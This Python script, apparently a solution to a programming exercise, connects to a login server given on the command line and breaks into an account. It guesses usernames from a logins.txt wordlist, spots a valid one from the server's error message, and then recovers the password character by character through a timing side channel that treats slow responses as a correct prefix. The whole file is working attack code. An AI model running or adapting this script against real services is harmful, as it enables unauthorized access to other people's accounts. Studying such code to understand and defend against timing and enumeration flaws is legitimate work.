import socket
import sys
import itertools
import string
import os
import json
import datetime

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits


def get_response_from_server(sckt, account_login, account_password):
    data = json.dumps({"login": account_login, "password": account_password}, indent=4)
    sckt.send(data.encode())
    response = sckt.recv(1024)
    response = json.loads(response.decode())
    return response["result"]


def generate_password_from_existing_one(account_password):
    for letter in chars:
        yield account_password + letter


def take_login_from_file():
    with open(os.path.join(os.getcwd(), 'logins.txt'), "r") as f:
        for line in f:
            yield line.strip()


def find_login(sckt):
    for login in take_login_from_file():
        if get_response_from_server(sckt, login, "") in ["Wrong password!", "Exception happened during login"]:
            return login


def find_password(sckt, login):
    temp_pass = ""
    while True:
        iter_password = generate_password_from_existing_one(temp_pass)
        for password in iter_password:
            start = datetime.datetime.now()
            answer = get_response_from_server(sckt, login, password)
            end = datetime.datetime.now()
            if (end - start).total_seconds() >= 0.05:
                temp_pass = password
                break
            if answer == "Connection success!":
                return password


if len(sys.argv) == 3:

    address = (sys.argv[1], int(sys.argv[2]))

    with socket.socket() as client:
        client.connect(address)
        real_login = find_login(client)
        real_password = find_password(client, real_login)
        log_pas = json.dumps({"login": real_login, "password": real_password}, indent=4)
        print(log_pas)

else:
    print('Invalid number of command line arguments!')